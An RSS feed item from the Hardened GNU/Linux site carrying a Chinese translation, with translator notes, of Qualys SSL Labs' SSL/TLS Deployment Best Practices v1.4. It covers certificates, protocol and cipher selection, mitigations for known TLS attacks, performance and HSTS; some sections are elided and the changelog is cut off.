<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hardened GNU/Linux</title>
    <description>We are a group of free software enthusiasts, anarchists, cyber security researchers. 0ld sch00l long lives!!!
</description>
    <link>http://www.hardenedlinux.org/</link>
    <atom:link href="http://www.hardenedlinux.org/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Tue, 28 Jul 2015 17:59:27 +0800</pubDate>
    <lastBuildDate>Tue, 28 Jul 2015 17:59:27 +0800</lastBuildDate>
    <generator>Jekyll v2.5.3</generator>
    
      <item>
        <title>SSL/TLS部署最佳实践v1.4</title>
        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)
Reviewers: Lenx Wei&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;

&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;

&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;

&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
编写应用程序。&lt;/p&gt;

&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;

&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
一些高级主题。因此，我们只提供简单实用容易理解的建议。
对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;

&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
服务器的身份。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;

&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;

&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
明显不妥。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
只在对安全有严格要求的机构中使用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;

&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
的用户产生疑惑从而影响对你的信任。&lt;/p&gt;

&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;

&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;

&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;

&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
中考虑以下因素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对待安全的态度&lt;/p&gt;

    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;足够大的市场占有率&lt;/p&gt;

    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;业务重心&lt;/p&gt;

    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提供哪些服务&lt;/p&gt;

    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;证书管理选项&lt;/p&gt;

    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
CA。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;技术支持&lt;/p&gt;

    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;

&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;

&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;

&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
则不行。&lt;/p&gt;

&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;

&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;

&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
它已经过时，不应该再被使用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
  的原因是兼容性问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
它几乎是安全的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
  请确认打上补丁。[T2][T3]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;

&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;

&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;

&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
冒充者或者存在能够监听的中间人），并且安全的交换数据。
在SSL/TLS里，加密套件是定义你如何安全通信的。
它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
你应该切换到其他的组件上。&lt;/p&gt;

&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉
&amp;gt; Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/li&gt;
  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端
&amp;gt; Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;

&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;

&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;

&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
来让浏览器选择支持正向安全。
为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;

&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;

&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
应该尽快的打每一个补丁。&lt;/p&gt;

&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;

    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
攻击。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭TLS压缩&lt;/p&gt;

    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;

    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;

    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭RC4&lt;/p&gt;

    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注意BEAST攻击&lt;/p&gt;

    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭SSLv3&lt;/p&gt;

    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
可以安全的实施。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;

&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;

&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;

&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
费CPU和影响用户体验的。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;

&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;

&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
HTTP请求。&lt;/p&gt;

&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;

&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
浏览器标记为公共资源（比如图片）。&lt;/p&gt;

&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;

&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
从而大幅降低连接耗时。&lt;/p&gt;

&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;

&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
包括如何安全的使用它们。&lt;/p&gt;

&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;

&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
以下问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;

&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;

&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;

&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;

&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
导致所有使用它的人全都自动被攻陷。&lt;/p&gt;

&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
风险并继续使用。&lt;/p&gt;

&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;
&lt;p&gt;……………………………&lt;/p&gt;

&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;

&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;
&lt;p&gt;……………………………
HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;

&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;

&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
站点则应该尽快支持。&lt;/p&gt;

&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;

&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;

&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;

&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
完整性——但还有其他威胁你必须面对。&lt;/p&gt;

&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;
&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;

&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;

&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
更深的理解，这些议题依然是受到争议的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Extended Validation证书&lt;/p&gt;

    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public key pinning&lt;/p&gt;

    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ECDSA私钥&lt;/p&gt;

    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;改动&lt;/p&gt;

&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
的时间，从1.3开始。&lt;/p&gt;

&lt;p&gt;版本 1.3 (2013年9月17日)
此版本的改动有：
• 推荐替换1024位证书
• 推荐不对SSLv3进行支持
• 删去推荐使用RC4来服务端避免BEAST攻击的内容
• 推荐禁用RC4
• 推荐在未来禁用3DES
• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
• 推荐支持正向安全
• 加入对ECDSA证书的讨论&lt;/p&gt;

&lt;p&gt;版本 1.4 (2014年12月8日）
此版本的改动有：
• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
• 推荐禁用SSLv3，提及POODLE攻击
• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
• 推荐OCSP Stap&lt;/p&gt;

&lt;p&gt;感谢&lt;/p&gt;

&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
自整个安全社区。&lt;/p&gt;

&lt;p&gt;关于SSL Labs
……………..&lt;/p&gt;

&lt;p&gt;关于Qualys
…………….&lt;/p&gt;

&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;

&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;

&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;

